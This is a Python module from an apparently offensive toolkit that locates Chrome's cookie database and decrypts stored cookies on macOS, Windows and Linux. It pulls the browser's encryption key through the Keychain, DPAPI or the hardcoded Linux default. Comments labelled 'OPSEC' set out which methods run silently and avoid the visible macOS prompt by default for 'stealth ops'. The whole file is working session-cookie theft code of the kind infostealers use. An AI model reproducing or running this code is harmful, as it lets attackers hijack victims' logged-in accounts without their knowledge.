"""Chromium cookie/credential decryption — cross-platform.

Handles Chrome's per-platform encryption:
  - macOS:   PBKDF2(Keychain password, salt='saltysalt', iter=1003) → AES-128-CBC
  - Windows: DPAPI CryptUnprotectData on os_crypt.encrypted_key → AES-256-GCM
  - Linux:   PBKDF2('peanuts' or secret-service, salt='saltysalt', iter=1) → AES-128-CBC

OPSEC NOTES:
  - macOS:   Reading Chrome Safe Storage from Keychain TRIGGERS a visible prompt!
  - Windows: DPAPI decryption is SILENT (runs as current user, no prompt)
  - Linux:   Hardcoded 'peanuts' key is SILENT. secret-service may prompt.

Requires: `cryptography` package (pip install cryptography)
"""

from __future__ import annotations

import base64
import json
import os
import shutil
import sqlite3
import struct
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ..platform_utils import chrome_user_data_dir, get_platform


class DecryptError(Exception):
    pass


def get_chrome_key(allow_prompt: bool = False) -> bytes:
    """Retrieve the Chrome encryption key for the current platform.

    Returns the raw AES key ready for decryption.

    OPSEC:
      macOS  → Keychain prompt (user-visible!) — SKIPPED by default
      Windows → DPAPI (silent, no prompt)
      Linux  → hardcoded or secret-service (usually silent)

    Set allow_prompt=True to enable macOS Keychain extraction (triggers
    a visible authorization dialog — NOT recommended for stealth ops).
    """
    plat = get_platform()

    if plat == "macos":
        if not allow_prompt:
            raise DecryptError(
                "macOS Chrome cookie decrypt requires Keychain prompt "
                "(Chrome Safe Storage). Skipped for OPSEC safety. "
                "Use --allow-prompt to override, or use device_code flow instead."
            )
        return _get_key_macos()
    elif plat == "windows":
        return _get_key_windows()
    else:
        return _get_key_linux()


def decrypt_cookie_value(encrypted: bytes, key: bytes) -> str:
    """Decrypt a Chrome encrypted cookie value.

    Chrome uses two encryption formats:
      - v10 (macOS/Linux): AES-128-CBC with PKCS7 padding
      - v10/v20 (Windows): AES-256-GCM with 12-byte nonce
    """
    if not encrypted:
        return ""

    plat = get_platform()

    # Check version prefix
    if encrypted[:3] == b"v10" or encrypted[:3] == b"v11":
        if plat == "windows":
            return _decrypt_aes_gcm(encrypted[3:], key)
        else:
            return _decrypt_aes_cbc(encrypted[3:], key)
    elif encrypted[:3] == b"v20":
        return _decrypt_aes_gcm(encrypted[3:], key)
    else:
        # Unencrypted or unknown format
        try:
            return encrypted.decode("utf-8")
        except UnicodeDecodeError:
            return ""


def extract_cookies(
    profile: str = "Default",
    host_patterns: Optional[List[str]] = None,
    key: Optional[bytes] = None,
) -> List[Dict[str, str]]:
    """Extract and decrypt cookies from Chrome's Cookies database.

    Args:
        profile: Chrome profile name (Default, Profile 1, etc.)
        host_patterns: List of host patterns to filter (e.g., ['.google.com', '.slack.com'])
        key: Pre-fetched encryption key. If None, will call get_chrome_key().

    Returns:
        List of dicts with: host, name, value, path, expires, secure, httponly
    """
    if key is None:
        key = get_chrome_key()

    chrome_dir = chrome_user_data_dir()
    cookies_db = chrome_dir / profile / "Cookies"

    # Newer Chrome versions moved Cookies to Network/Cookies
    if not cookies_db.exists():
        cookies_db = chrome_dir / profile / "Network" / "Cookies"

    if not cookies_db.exists():
        raise DecryptError(f"Cookies database not found at {cookies_db}")

    # Copy database to avoid lock conflicts with running Chrome
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(str(cookies_db), tmp)

    # Also copy WAL if present (contains recent uncommitted writes)
    for suffix in ["-wal", "-journal"]:
        wal = Path(str(cookies_db) + suffix)
        if wal.exists():
            shutil.copy2(str(wal), tmp + suffix)

    results = []
    try:
        conn = sqlite3.connect(tmp)
        conn.execute("PRAGMA journal_mode=wal")  # Handle WAL mode

        # Build query with optional host filter
        query = (
            "SELECT host_key, name, encrypted_value, value, path, "
            "expires_utc, is_secure, is_httponly "
            "FROM cookies"
        )
        params: list = []

        if host_patterns:
            clauses = []
            for pattern in host_patterns:
                clauses.append("host_key LIKE ?")
                params.append(f"%{pattern}%")
            query += " WHERE " + " OR ".join(clauses)

        query += " ORDER BY host_key, name"

        for row in conn.execute(query, params):
            host, name, enc_value, plain_value, path, expires, secure, httponly = row

            # Prefer encrypted value, fall back to plain
            if enc_value:
                try:
                    value = decrypt_cookie_value(enc_value, key)
                except Exception:
                    value = plain_value or ""
            else:
                value = plain_value or ""

            if not value:
                continue

            results.append({
                "host": host,
                "name": name,
                "value": value,
                "path": path,
                "expires": expires,
                "secure": bool(secure),
                "httponly": bool(httponly),
            })

        conn.close()
    finally:
        # Clean up temp copy
        for suffix in ["", "-wal", "-journal"]:
            try:
                os.unlink(tmp + suffix)
            except OSError:
                pass

    return results


# ── Platform-specific key retrieval ──────────────────────────────


def _get_key_macos() -> bytes:
    """macOS: Read Chrome Safe Storage password from Keychain, derive AES key.

    WARNING: This triggers a visible Keychain authorization prompt!
    """
    try:
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
    except ImportError:
        raise DecryptError(
            "cryptography package required: pip install cryptography"
        )

    # Read password from Keychain (TRIGGERS PROMPT!)
    result = subprocess.run(
        ["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"],
        capture_output=True, text=True, timeout=30,
    )

    if result.returncode != 0 or not result.stdout.strip():
        raise DecryptError(
            "Failed to read Chrome Safe Storage from Keychain. "
            "User may have denied the prompt. "
            "OPSEC: This triggers a visible authorization dialog."
        )

    password = result.stdout.strip().encode("utf-8")

    # Derive AES-128 key using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b"saltysalt",
        iterations=1003,
    )
    return kdf.derive(password)


def _get_key_windows() -> bytes:
    """Windows: Read encrypted key from Local State, decrypt with DPAPI.

    SILENT — no user prompt. DPAPI uses the current user's credentials.
    """
    try:
        import ctypes
        import ctypes.wintypes
    except ImportError:
        raise DecryptError("Windows DPAPI requires ctypes (Windows only)")

    chrome_dir = chrome_user_data_dir()
    local_state = chrome_dir / "Local State"

    if not local_state.exists():
        raise DecryptError(f"Local State not found: {local_state}")

    data = json.loads(local_state.read_text())
    encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")

    if not encrypted_key_b64:
        raise DecryptError("encrypted_key not found in Local State")

    encrypted_key = base64.b64decode(encrypted_key_b64)

    # Strip DPAPI prefix (5 bytes: "DPAPI")
    if encrypted_key[:5] == b"DPAPI":
        encrypted_key = encrypted_key[5:]

    # Decrypt using DPAPI
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.wintypes.DWORD),
            ("pbData", ctypes.POINTER(ctypes.c_char)),
        ]

    input_blob = DATA_BLOB(
        len(encrypted_key),
        ctypes.cast(
            ctypes.create_string_buffer(encrypted_key),
            ctypes.POINTER(ctypes.c_char),
        ),
    )
    output_blob = DATA_BLOB()

    if not ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(input_blob),
        None, None, None, None, 0,
        ctypes.byref(output_blob),
    ):
        raise DecryptError("DPAPI CryptUnprotectData failed")

    key = ctypes.string_at(output_blob.pbData, output_blob.cbData)
    ctypes.windll.kernel32.LocalFree(output_blob.pbData)
    return key


def _get_key_linux() -> bytes:
    """Linux: Use hardcoded 'peanuts' password or secret-service.

    SILENT — no user prompt (for the hardcoded key path).
    """
    try:
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
    except ImportError:
        raise DecryptError(
            "cryptography package required: pip install cryptography"
        )

    password = b"peanuts"  # Chrome's hardcoded default on Linux

    # Try secret-service (GNOME Keyring / KDE Wallet) first
    try:
        import secretstorage
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        if collection.is_locked():
            collection.unlock()
        for item in collection.get_all_items():
            if item.get_label() == "Chrome Safe Storage":
                password = item.get_secret()
                break
    except Exception:
        pass  # Fall back to 'peanuts'

    # Derive AES-128 key using PBKDF2 (1 iteration on Linux!)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b"saltysalt",
        iterations=1,
    )
    return kdf.derive(password)


# ── Decryption primitives ────────────────────────────────────────


def _decrypt_aes_cbc(data: bytes, key: bytes) -> str:
    """AES-128-CBC with PKCS7 padding (macOS/Linux v10 format).

    IV is 16 bytes of space (0x20).
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding

    iv = b" " * 16  # Chrome uses spaces as IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(data) + decryptor.finalize()

    # Remove PKCS7 padding
    unpadder = padding.PKCS7(128).unpadder()
    unpadded = unpadder.update(decrypted) + unpadder.finalize()

    return unpadded.decode("utf-8", errors="replace")


def _decrypt_aes_gcm(data: bytes, key: bytes) -> str:
    """AES-256-GCM (Windows v10/v20 format).

    Format: [12-byte nonce][ciphertext + 16-byte GCM tag]
    The tag is appended to the ciphertext by cryptography library convention.
    """
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    nonce = data[:12]
    ciphertext_with_tag = data[12:]

    try:
        aesgcm = AESGCM(key)
        decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
        return decrypted.decode("utf-8", errors="replace")
    except Exception:
        # Some Chrome versions use a slightly different layout or
        # the key doesn't match.  Try with empty AAD variants.
        try:
            # Try with empty bytes as AAD
            decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, b"")
            return decrypted.decode("utf-8", errors="replace")
        except Exception:
            pass

        # Last resort: try AES-CBC in case the version prefix was misleading
        try:
            return _decrypt_aes_cbc(data, key[:16])
        except Exception:
            return ""
